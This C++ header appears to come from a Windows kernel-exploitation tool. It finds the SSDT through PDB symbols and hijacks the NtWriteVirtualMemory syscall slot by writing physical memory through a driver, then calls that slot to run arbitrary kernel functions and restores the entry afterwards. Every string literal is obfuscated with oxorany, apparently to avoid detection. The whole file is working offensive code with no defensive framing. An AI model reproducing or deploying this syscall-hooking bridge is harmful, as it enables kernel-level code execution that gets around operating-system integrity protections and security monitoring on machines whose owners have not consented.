#ifndef syscall_syscall_hpp
#define syscall_syscall_hpp

namespace syscall {

    constexpr std::uint32_t k_ssdt_rva_mask     = 0xFFFFFFF0;
    constexpr std::uint32_t k_ssdt_argcount_mask = 0x0000000F;
    constexpr std::uint32_t k_ssdt_rva_shift    = 4;

    class c_syscall {
    public:
        explicit c_syscall( driver::c_driver& drv, paging::c_paging& pg, pdb::c_pdb& pdb )
            : m_p_driver( &drv ), m_p_paging( &pg ), m_p_pdb( &pdb ) {}

        ~c_syscall() = default;

        c_syscall( const c_syscall& )            = delete;
        c_syscall& operator=( const c_syscall& ) = delete;

        bool setup() {
            const auto ke_service_descriptor_table =
                m_p_pdb->get_symbol_address( oxorany( "KeServiceDescriptorTable" ) );
            if ( !ke_service_descriptor_table ) {
                klog::print_error( oxorany( "[syscall] symbol KeServiceDescriptorTable not present in PDB" ) );
                return false;
            }

            std::uint64_t ssdt_data[ 4 ]{};
            if ( !m_p_paging->read_virtual_memory( ke_service_descriptor_table, ssdt_data, sizeof( ssdt_data ) ) ) {
                klog::print_error( oxorany( "[syscall] could not dereference KeServiceDescriptorTable from kernel memory" ) );
                return false;
            }

            m_ssdt_base = ssdt_data[ 0 ];
            const auto count = ssdt_data[ 2 ];
            klog::print_info( oxorany( "[syscall] SSDT located -> base=0x%llx, entries=%llu" ), m_ssdt_base, count );

            const auto nt_proxy =
                m_p_pdb->get_symbol_address( oxorany( "NtWriteVirtualMemory" ) );
            if ( !nt_proxy ) {
                klog::print_error( oxorany( "[syscall] proxy symbol NtWriteVirtualMemory missing from PDB" ) );
                return false;
            }

            std::vector<std::uint32_t> table( count );
            if ( !m_p_paging->read_virtual_memory( m_ssdt_base, table.data(), count * sizeof( std::uint32_t ) ) ) {
                klog::print_error( oxorany( "[syscall] bulk read of SSDT table failed" ) );
                return false;
            }

            const auto target_rva = static_cast<int>( nt_proxy - m_ssdt_base ) << k_ssdt_rva_shift;
            for ( std::size_t idx = 0; idx < count; ++idx ) {
                if ( ( table[ idx ] & k_ssdt_rva_mask ) != ( target_rva & k_ssdt_rva_mask ) )
                    continue;

                m_saved_entry = table[ idx ];
                m_entry_va    = m_ssdt_base + idx * sizeof( std::uint32_t );
                m_entry_pa    = m_p_paging->translate_virtual_to_physical( m_entry_va );

                klog::print_info( oxorany( "[syscall] proxy entry matched -> idx=%llu raw=0x%08x" ),
                    idx, m_saved_entry );
                break;
            }

            if ( !m_entry_pa ) {
                klog::print_error( oxorany( "[syscall] NtWriteVirtualMemory not reachable through any SSDT slot" ) );
                return false;
            }

            klog::print_info( oxorany( "[syscall] bridge armed -> entry_va=0x%llx (original=0x%08x)" ),
                m_entry_va, m_saved_entry );
            return true;
        }

        template <typename ret_t = std::uint64_t,
                  typename a1_t  = void*, typename a2_t = void*,
                  typename a3_t  = void*, typename a4_t = void*,
                  typename a5_t  = void*, typename a6_t = void*,
                  typename a7_t  = void*, typename a8_t = void*,
                  typename a9_t  = void*, typename a10_t = void*>
        ret_t call_kernel( std::uint64_t func,
                           a1_t  a1  = {}, a2_t  a2  = {}, a3_t  a3  = {},
                           a4_t  a4  = {}, a5_t  a5  = {}, a6_t  a6  = {},
                           a7_t  a7  = {}, a8_t  a8  = {}, a9_t  a9  = {},
                           a10_t a10 = {} ) {
            if ( !m_entry_pa ) {
                klog::print_error( oxorany( "[syscall] call_kernel invoked before bridge setup" ) );
                if constexpr ( std::is_void_v<ret_t> ) return;
                else                                   return ret_t{};
            }

            std::unique_lock lock( m_lock );

            const auto new_rva   = static_cast<int>( func - m_ssdt_base ) << k_ssdt_rva_shift;
            const auto new_entry = ( new_rva & k_ssdt_rva_mask ) | ( m_saved_entry & k_ssdt_argcount_mask );

            if ( !m_p_driver->write_physical_memory( m_entry_pa, &new_entry, sizeof( new_entry ) ) ) {
                if constexpr ( std::is_void_v<ret_t> ) return;
                else                                   return ret_t{};
            }

            using fn_t = void* ( __stdcall* )(
                a1_t, a2_t, a3_t, a4_t, a5_t,
                a6_t, a7_t, a8_t, a9_t, a10_t );

            auto* nt_fn = reinterpret_cast<fn_t>(
                ::GetProcAddress( ::GetModuleHandleA( oxorany( "ntdll.dll" ) ),
                    oxorany( "NtWriteVirtualMemory" ) ) );

            void* result = nullptr;
            if ( nt_fn )
                result = nt_fn( a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 );

            m_p_driver->write_physical_memory( m_entry_pa, &m_saved_entry, sizeof( m_saved_entry ) );

            if constexpr ( std::is_void_v<ret_t> ) return;
            else                                   return reinterpret_cast<ret_t>( result );
        }

    private:
        driver::c_driver* m_p_driver  = nullptr;
        paging::c_paging* m_p_paging  = nullptr;
        pdb::c_pdb*       m_p_pdb     = nullptr;

        std::shared_mutex m_lock{};
        std::uint64_t     m_ssdt_base   = 0;
        std::uint64_t     m_entry_va    = 0;
        std::uint64_t     m_entry_pa    = 0;
        std::uint32_t     m_saved_entry = 0;
    };

} // namespace syscall

#endif // syscall_syscall_hpp